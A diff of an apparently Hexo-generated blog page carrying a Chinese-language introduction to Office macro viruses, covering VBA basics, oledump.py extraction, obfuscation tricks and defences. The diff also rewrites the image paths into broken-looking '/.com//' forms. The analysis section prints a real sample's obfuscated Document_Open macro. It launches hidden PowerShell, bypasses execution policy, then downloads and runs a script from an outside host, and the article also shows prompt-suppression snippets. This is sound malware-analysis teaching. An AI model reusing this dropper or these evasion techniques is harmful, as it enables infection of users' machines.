@@ -76,7 +76,7 @@
     <li>
         <div class="all active" data-rel="All">All
             
-                <small>(90)</small>
+                <small>(89)</small>
             
         </div>
     </li>
@@ -579,7 +579,7 @@
         
     </div>
 </div>
-<input type="hidden" id="yelog_site_posts_number" value="90">
+<input type="hidden" id="yelog_site_posts_number" value="89">
 
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
@@ -641,15 +641,6 @@
            data-author="" >
             <span class="post-title" title="对中国整个安全行业的理解">对中国整个安全行业的理解</span>
             <span class="post-date" title="2023-06-14 16:06:36">2023/06/14</span>
-        </a>
-        
-        
-        <a  class="All "
-           href="/2024/06/20/hello-world/"
-           data-tag=""
-           data-author="" >
-            <span class="post-title" title="Hello World">Hello World</span>
-            <span class="post-date" title="2024-06-20 14:35:01">2024/06/20</span>
         </a>
         
         
@@ -1522,11 +1513,11 @@
       
         <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>宏病毒是一种常见的计算机病毒，寄存在文档或模板中，但是并不会直接感染可执行程序。其诞生于上世纪90年代，自其诞生之日，各种各样的宏病毒不断在网络上涌现。早期的宏病毒是病毒先驱者们展现高超技术的舞台，只感染文档文件，随着时间的推移，宏病毒的危害也越来越大，宏病毒不再只是感染文档文件，而成为了分发恶意程序的常规途经。宏病毒的执行简易隐蔽快速，一旦用户打开含有宏病毒的文档，其中的宏病毒就会被执行。 对于攻击者而言，宏病毒是一把利器，尤其是结合了社会工程学的宏病毒。如乌克兰电网事件（BlackEnergy），工作人员只是打开了一篇看似很正常的文档，然后便造成了无法挽回的损失。不只是BlackEnergy，近来肆虐的各种各样的勒索软件，都离不开Office宏的帮助。借助传统的宏病毒，一旦用户打开含有宏病毒的文档，其中的宏病毒就会被执行，释放并激活恶意软件</p>
 <h1 id="宏与宏病毒"><a href="#宏与宏病毒" class="headerlink" title="宏与宏病毒"></a>宏与宏病毒</h1><p>宏（英文Macro），广义上的定义是：宏就是把一系列的指令组织成一独立的命令，类似C语言中#define宏定义，避免同一动作的一再重复；狭义上，宏特指office系列办公软件中的宏，Microsoft Office中对宏的定义为“宏就是能够组织在一起的，可以作为一个独立命令来执行的一系列Word 命令，它能使日常工作变得容易。”本文中提到的宏，采用了狭义的定义，即office办公软件中的宏。使用office打开文档文件(demo1.doc)时，有时候我们会遇到如下图所示的“安全警告”，这说明该文档文件中含有宏，并且office软件设置了“宏禁用”功能。</p>
-<p><img src="/%E5%AE%8F%E7%97%85%E6%AF%92%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/1.png"></p>
+<p><img src="/.com//1.png"></p>
 <p>这个时候，单击“启用内容”按钮，宏就会执行。使用快捷键Alt+F11可以打开vb编辑器，查看宏代码</p>
-<p><img src="/%E5%AE%8F%E7%97%85%E6%AF%92%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/2.png"></p>
+<p><img src="/.com//2.png"></p>
 <p>本例中的宏很简单，其作用就是弹出一个对话框。执行恶意功能的宏就是宏病毒。宏病毒是使用宏语言编写的恶意程序，存在于字处理文档、电子数据表格、数据库、演示文档等数据文件中，可以在office系列办公软件中运行，利用宏的功能将自己复制到其他数据文件中。宏病毒感染的是数据文件。宏病毒与传统的病毒有很大的不同，它不感染可执行文件，而是潜伏在Microsoft Office文档中，一旦用户打开含有宏的文档，其中的宏就会被执行。宏是使用VBA编写的，编写过程简单，任何人只需掌握一些基本的宏编写技能就可以编写出破坏力巨大的宏病毒</p>
-<p><img src="/%E5%AE%8F%E7%97%85%E6%AF%92%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/4.png"></p>
+<p><img src="/.com//4.png"></p>
 <p>宏病毒的强大是建立在强大的VBA组件的基础上的。同时，宏病毒与系统平台无关，任何计算机如果能够运行Microsoft Office办公软件，都有可能感染宏病毒。随着Microsoft Office系列办公软件成为电子文档的工业标准，Word，Excel和PowerPoint等已成为个人计算机和互联网上广泛使用的文档格式，宏病毒成为传播最广泛，危害最大的一类病毒。根据文档载体的不同，宏病毒可以细分为很多种，Word、Excel、Access、PowerPoint等都有想应的宏病毒</p>
 <h1 id="VB基础"><a href="#VB基础" class="headerlink" title="VB基础"></a>VB基础</h1><p>宏是使用VB语言编写的，所以在进一步研究宏病毒前，我们必须掌握VB的基础知识。本文介绍的VB知识，只是VB的皮毛，以便于在接下来宏病毒分析过程中，我们可以迅速理清宏代码。打开demo3.doc，我们以其为例进行讲解。其代码如下</p>
 <figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Sub</span> autoopen()    </span><br><span class="line">    b</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Function</span> b()</span><br><span class="line">    MsgBox ActiveDocument.BuiltInDocumentProperties(<span class="number">5</span>)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br></pre></td></tr></table></figure>
@@ -1534,36 +1525,36 @@
 <p>sub在VB中被称为过程，function被称为函数；sub没有返回值，function有返回值；一段宏一定是从sub开始执行的。在demo3中定义了一个过程 autoopen()，“End Sub”表示这个过程的结束</p>
 <h2 id="VB基本函数"><a href="#VB基本函数" class="headerlink" title="VB基本函数"></a>VB基本函数</h2><p>MsgBox ActiveDocument.BuiltInDocumentProperties(5)”调用了VB基本函数“MsgBox”，参数是”ActiveDocument.BuiltInDocumentProperties(5)”。这里的正确写法应该是“MsgBox(ActiveDocument.BuiltInDocumentProperties(5))”，但是VBA的容错率较高，不写括号，宏代码依然能够执行。即使我们将“MsgBox”写成“MSgbOx”，宏代码依然能够执行。一些宏病毒就是使用大小写混淆，增加病毒分析难度。除了MsgBox，VB中还有很多基本函数，各位可以百度“VB函数大全”。</p>
 <h2 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h2><p> VB中存在很多对象，如Application对象，Document对象，Adobd.stream对象等。对象实际上是代码和数据的组合，我们在使用对象时，要么使用对象的属性（就是数据），要么使用对象的方法（就是代码）。通过 “对象.属性&#x2F;方法”的方式使用对象的属性&#x2F;方法。ActiveDocument.BuiltInDocumentProperties(5)中就是使用了ActiveDocument对象的BuiltInDocumentProperties()方法，参数是5。其代表的内容是“文件属性-详细信息-备注”里的内容</p>
-<p><img src="/%E5%AE%8F%E7%97%85%E6%AF%92%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/3.png"></p>
+<p><img src="/.com//3.png"></p>
 <h1 id="宏病毒实例分析"><a href="#宏病毒实例分析" class="headerlink" title="宏病毒实例分析"></a>宏病毒实例分析</h1><p>demo2.doc为例，实例分析宏病毒，demo2是一个真实的宏病毒，请在虚拟机中分析。</p>
 <p>打开demo2.doc，发现弹出了“安全警告”，文本中内容提示用户要点击“启用内容”才能看到文件内容，实际上这里是社会工程学攻击，用户单击“启用内容”就会运行宏，并感染病毒：</p>
 <p> ALT+F11打开VBA编辑器，查看宏代码。但是你会发现，此时工程里没有数据，这是因为我们没有单击“启用内容”，VBA工程还没有加载。单击“启用内容”，这个时候宏就已经运行了，再次查看VBA编辑器，弹出了要求输入密码的对话框。</p>
-<p><img src="/%E5%AE%8F%E7%97%85%E6%AF%92%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/5.png"></p>
+<p><img src="/.com//5.png"></p>
 <p>除了输入密码，我们不能看到其他信息，看来这段宏被加密了，接下来我们就要祭出神器VBA_Password_Bypasser进行解密了。关闭demo2.doc ，使用VBA_Password_Bypasser重新打开demo2.doc，再次打开VBA编辑器查看宏代码，宏代码一览无余</p>
 <figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Private</span> <span class="keyword">Sub</span> Document_Open()</span><br><span class="line"><span class="keyword">Dim</span> CGJKIYRSDGHJHGFFG <span class="keyword">As</span> <span class="type">String</span></span><br><span class="line">CGJKIYRSDGHJHGFFG = <span class="string">&quot;cmd /K &quot;</span> + <span class="string">&quot;pow&quot;</span> + <span class="string">&quot;eR&quot;</span> &amp; <span class="string">&quot;sh&quot;</span> + <span class="string">&quot;ell.e&quot;</span> + <span class="string">&quot;x&quot;</span> + <span class="string">&quot;e -WindowStyle hiddeN -ExecuTionPolicy BypasS -noprofile (New-Object System.Net.WebClient).DownloadFile(&#x27;http://skycpa.in/file.php&#x27;,&#x27;%TEMP%\Y.ps1&#x27;); poWerShEll.exe -WindowStyle hiddeN -ExecutionPolicy Bypass -noprofile -file %TEMP%\Y.ps1&quot;</span></span><br><span class="line">Shell CGJKIYRSDGHJHGFFG, <span class="number">0</span></span><br><span class="line">MsgBox (<span class="string">&quot;Unreferenced library required&quot;</span>)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure>
 
 <p>这段宏首先拼接了一段字符串CGJKIYRSDGHJHGFFG，这段字符串是一段命令，接下来就调用Shell() ，执行这段命令。但是CGJKIYRSDGHJHGFFG的内容经过混淆，</p>
 <p>我们没办法一眼看出执行了什么命令，我们可以改造宏代码，使用Msgbox将CGJKIYRSDGHJHGFFG这段命令打印出来</p>
-<p><img src="/%E5%AE%8F%E7%97%85%E6%AF%92%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/6.png"></p>
-<p><img src="/%E5%AE%8F%E7%97%85%E6%AF%92%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/7.png"></p>
+<p><img src="/.com//6.png"></p>
+<p><img src="/.com//7.png"></p>
 <p>现在就一目了然了，这段cmd命令执行了两段powershell命令，第一段powershell命令是从’<a target="_blank" rel="noopener" href="http://skycpa.in/file.php'%E4%B8%AD%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%EF%BC%8C%E5%B9%B6%E5%8F%A6%E5%AD%98%E4%B8%BA'%TEMP%/Y.ps1'%EF%BC%8C%E7%AC%AC%E4%BA%8C%E6%AE%B5powershell%E5%91%BD%E4%BB%A4%E5%B0%B1%E6%98%AF%E6%89%A7%E8%A1%8CY.ps1%EF%BC%8C%E5%85%B3%E4%BA%8EY.ps1%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8D%E5%B1%9E%E4%BA%8E%E5%AE%8F%E7%97%85%E6%AF%92%E7%9A%84%E8%8C%83%E7%95%B4%EF%BC%8C%E8%BF%99%E9%87%8C%E5%B0%B1%E4%B8%8D%E5%81%9A%E5%88%86%E6%9E%90%E4%BA%86%E3%80%82">http://skycpa.in/file.php&#39;中下载文件，并另存为&#39;%TEMP%\Y.ps1&#39;，第二段powershell命令就是执行Y.ps1，关于Y.ps1的分析不属于宏病毒的范畴，这里就不做分析了。</a></p>
 <h2 id="oledump-py"><a href="#oledump-py" class="headerlink" title="oledump.py"></a>oledump.py</h2><p>在之前的分析中，我们先启用宏，然后打开VBA编辑器分析宏代码。这个时候我们不仅可以直观的看到宏代码，还可以动态调试。但是，我们选择启用宏后，宏代码就会运行，如果存在恶意行为，恶意行为就会执行。这样的分析方式存在一定的风险，那么，有没有一种方式，不运行宏就能查看宏代码呢？当然有，那就是oledump.pyoledump.py是一个用于分析OLE文件（复合文件二进制格式）的程序，我们可以使用它提取文档中的宏代码。其查找基于二进制文件格式的文件中的内容的流程：1.读取文件流。2.识别可能包含要查找的内容的结构。3.通过第一个结构，找到下一节的位置。4.在流中转到该节。5.重复前面两个步骤，直到找到所需的内容。6.读取并分析内容。</p>
 <p>接下来我们简单介绍一下oledump的使用，我们依然以demo2为例进行介绍：运行：oledump.py demo2.doc</p>
-<p><img src="/%E5%AE%8F%E7%97%85%E6%AF%92%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/8.png"></p>
+<p><img src="/.com//8.png"></p>
 <p>这是oledump对doc文件的最基础的分析，显示了这个文件的Stream数据(在接下来的章节中我们会进行介绍Stream)，一共包含5段，其中A3这一段数据上标记了字母‘M’，表示这段数据中含有VBA宏(Macro）。oledump.py有许多参数可以选择，使用oledump.py -m 可以查看oledump.py 的帮助信息，这里我们要用到的参数是-s和-v-s 段号：选择上分析出的某一段来查看内容-v ：解压缩VBA宏上面两个参数结合起来用就可以找出宏源码：oledump.py -s A3 -v demo2.doc</p>
-<p><img src="/%E5%AE%8F%E7%97%85%E6%AF%92%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/9.png"></p>
+<p><img src="/.com//9.png"></p>
 <p>可以看到宏代码被解析出来了。在实际分析时，-s后的参数可以选择‘a’，表示分析所有段的数据，还可以使用‘&gt;’符号将宏代码数据存储在新文件中：</p>
-<p><img src="/%E5%AE%8F%E7%97%85%E6%AF%92%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/10.png"></p>
+<p><img src="/.com//10.png"></p>
 <p>最后，再介绍一下 decoder_ay.py和-d参数，它可以将文件中的exe数据dump下来。有一些文档宏存储了exe数据，这个时候我们就可以使用下列命令，将文档中的exe数据导出：oledump.py -s 14 -D decoder_ay.py -d 1.doc &gt;1.exe如果我们只是想dump某一段数据，而不关心是不是exe数据，使用如下命令：Oledump.py -s 段名 -d 文件名 &gt;新文件名</p>
 <h1 id="宏病毒的分析技巧"><a href="#宏病毒的分析技巧" class="headerlink" title="宏病毒的分析技巧"></a>宏病毒的分析技巧</h1><h2 id="自动执行"><a href="#自动执行" class="headerlink" title="自动执行"></a>自动执行</h2><p>宏病毒分析的第一步是定位自动执行入口。宏病毒具有自动执行的特性，特别是含有AutoOpen的宏，一旦用户打开含有宏的文档，其中的宏就会被执行，而用户一无所知。宏病毒的激发机制有三种：利用自动运行的宏，修改Word命令和利用Document对象的事件。宏病毒中常用的自动执行方法有两种：一种是用户执行某种操作时自动执行的宏，如Sub botton(),当用户单击文档中的按钮控件时，宏自动执行；另一种则是Auto自动执行，如Sub AutoOpen()和Sub AutoClose()，分别在文档打开和关闭时自动执行。</p>
 <h2 id="隐秘执行"><a href="#隐秘执行" class="headerlink" title="隐秘执行"></a>隐秘执行</h2><p>宏病毒利用几行代码就可以实现隐秘，下列代码是从宏病毒样本1（MD5：f849544803995b98342415dd2e67180c）中提取的代码片段，宏病毒通过阻止弹出各类提示，防止用户发现宏正在运行来实现自我隐藏</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">On Error Resume Next     </span><br><span class="line">&#x27;如果发生错误，不弹出错误对话框</span><br><span class="line">Application.DisplayStatusBar = False  &#x27;进制显示状态栏</span><br><span class="line">Options.SaveNormalPrompt = False    &#x27;修改公用模板时自动保存，不弹出提示</span><br></pre></td></tr></table></figure>
 
-<p>宏病毒自我隐藏还有一种方式，那就是屏蔽菜单按钮和快捷键，普通用户即使猜测到有宏正在运行，也无法取消正在执行中的宏，查看宏信息。下表是笔者总结的宏病毒采取的隐蔽执行的一些措施：<img src="/%E5%AE%8F%E7%97%85%E6%AF%92%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/11.png"></p>
+<p>宏病毒自我隐藏还有一种方式，那就是屏蔽菜单按钮和快捷键，普通用户即使猜测到有宏正在运行，也无法取消正在执行中的宏，查看宏信息。下表是笔者总结的宏病毒采取的隐蔽执行的一些措施：<img src="/.com//11.png"></p>
 <h2 id="调用外部例程和命令执行"><a href="#调用外部例程和命令执行" class="headerlink" title="调用外部例程和命令执行"></a>调用外部例程和命令执行</h2><p>宏病毒的强大主要来自与对Windows API和外部例程的调用，通过对大量样本的分析，本文总结出一张宏病毒调用的外部例程表。</p>
-<p><img src="/%E5%AE%8F%E7%97%85%E6%AF%92%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/12.png"></p>
+<p><img src="/.com//12.png"></p>
 <p>如图所示，使用Wscript.shell实现命令执行功能：</p>
-<p><img src="/%E5%AE%8F%E7%97%85%E6%AF%92%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/13.png"></p>
+<p><img src="/.com//13.png"></p>
 <p>上表中Wscript.shell、Poweshell、Application.Run、Shell.Application这些外部例程都可以用来执行命令，除此之外，一些API如：Shell( )、CallWindowProc( )也常用于执行命令。</p>
 <h2 id="字符串隐写"><a href="#字符串隐写" class="headerlink" title="字符串隐写"></a>字符串隐写</h2><p>宏病毒分析比较简单，这是因为任何能执行宏的用户都能查看宏源码，分析人员轻而易举就分析出宏病毒的行为。通过扫描宏中特征字符串，杀软也很容易检测出宏病毒。宏病毒的开发者们便想尽办法隐藏这些特征字符串，下面本文就对宏病毒中这些字符串的隐写方式进行分析。</p>
 <h2 id="Chr（）函数"><a href="#Chr（）函数" class="headerlink" title="Chr（）函数"></a>Chr（）函数</h2><p>Chr()，返回以数值表达式值为编码的字符（例如：Chr(70)返回字符‘F’）。使用Chr函数是最常见的字符串隐写技术,利用ascii码，逃避字符串扫描。如下列代码：</p>
@@ -1588,7 +1579,7 @@
 <h2 id="利用窗体、控件隐藏信息"><a href="#利用窗体、控件隐藏信息" class="headerlink" title="利用窗体、控件隐藏信息"></a>利用窗体、控件隐藏信息</h2><p>控件在宏程序里很常见，有些宏病毒的制造者们便想到利用控件隐藏危险字符串。控件里存放着关键字符串，程序用到上述字符串时，只需要调用标签控件的caption属性。控件的各个属性（name、caption、controtiptext、等）都可以成为危险字符串的藏身之所。而仅仅查看宏代码，分析者无法得知这些字符串内容，分析者必须进入编辑器查看窗体属性，这大大增加了分析的难度。</p>
 <h2 id="利用文件属性"><a href="#利用文件属性" class="headerlink" title="利用文件属性"></a>利用文件属性</h2><p>这种方式和利用窗体属性的方式类似，就是将一切能存储数据的地方利用起来。就像Demo3中读取文件详细信息中的备注</p>
 <h2 id="恶意行为字符串"><a href="#恶意行为字符串" class="headerlink" title="恶意行为字符串"></a>恶意行为字符串</h2><p> 不同的宏病毒执行不同的恶意行为，但这些恶意行为是类似的，它们使用的代码往往是相似的。通过量的样本分析，笔者总结了一些宏病毒执行危险操作时代码中含有的字符串，详见下表：</p>
-<p><img src="/%E5%AE%8F%E7%97%85%E6%AF%92%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/14.png"></p>
+<p><img src="/.com//14.png"></p>
 <h1 id="宏病毒的防御手段"><a href="#宏病毒的防御手段" class="headerlink" title="宏病毒的防御手段"></a>宏病毒的防御手段</h1><p>安装杀毒软件，打全系统补丁是预防计算机病毒的基本措施，当然也适用于宏病毒，除此这些常规手段之外，宏病毒还有专门的防治措施。</p>
 <h2 id="禁用宏"><a href="#禁用宏" class="headerlink" title="禁用宏"></a>禁用宏</h2><p>由于宏病毒的肆虐，Microsoft不得不在Office办公软件中提供了禁止宏的功能，用户只需要将其打开激活即可再次运行宏。以word2013为例，禁用宏的方法是：单击开发工具菜单下的“宏”，单击“宏安全性”，在随后的出现的对话框中选择“禁用所有宏，并发出通知”这个方法一度被认为能防住所有的宏病毒，但是总会有0day能够绕过宏防护，禁用宏对于利用漏洞绕过宏禁用功能的宏病毒，仍然无能为力。而且禁用宏功能还有两个很大的缺陷：一是它拒绝了一切的宏执行，并不区分正常的宏和还是病毒宏，这会造成某些文档无法打开或出错；二是宏病毒防护无法阻止启动word时Autoexec.DOT中的宏和Normal.DOT中的宏自动执行。</p>
 <h2 id="越过自动宏"><a href="#越过自动宏" class="headerlink" title="越过自动宏"></a>越过自动宏</h2><p>如果怀疑文档中存在宏病毒，可以在Office打开文档的时候，始终按住SHift键，将禁止存在的一起自动宏。这和禁用宏有异曲同工之妙，Shift键可以在退出时禁止任何AutoClose宏。这种方法的缺陷也很明显，它只能对付一时，当宏病毒利用其它菜单选项来实现破坏活动，这种方法就不再有效。</p>
@@ -1601,9 +1592,9 @@
 <p>Tool：微软提供的office二进制格式查看工具，用于学习doc，xls，ppt等文档二进制格式；</p>
 <p>010Editor：一款流行的二进制编辑器。</p>
 <p>（2）doc、docx和docm许多用户在新建word文档时会发现有两个选项，新建Microsoft Word 97 - 2003 文档和新建新建 Microsoft Word文档。当用户点击新建Microsoft Word 97 - 2003 文档时，就会创建出一个.doc文件；而用户点击新建Microsoft Word文档时，就会创建出一个.docx文件，实际上Microsoft Word 2007及之后的Word版本还支持.docm文件，那么这三种文件有什么区别呢？.doc文件是一种普通的OLE文件(复合文件)，能够包含宏。而.docx和.docm文件，实际上都是是压缩文件，下图是.doc文件.docx和.docm文件头二进制数据的对比图：</p>
-<p><img src="/%E5%AE%8F%E7%97%85%E6%AF%92%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/15.png"></p>
-<p><img src="/%E5%AE%8F%E7%97%85%E6%AF%92%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/16.png"></p>
-<p><img src="/%E5%AE%8F%E7%97%85%E6%AF%92%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/17.png"></p>
+<p><img src="/.com//15.png"></p>
+<p><img src="/.com//16.png"></p>
+<p><img src="/.com//17.png"></p>
 <p>将docx.docx文件的文件名修改为docx.zip就可以以压缩包的形式打开.docx文件，如图所示：</p>
 <p>实际上.docx主要的内容基本都存在于word目录下，比较重要的有以下的内容</p>
 <p>document.xml：记录Word文档的正文内容</p>
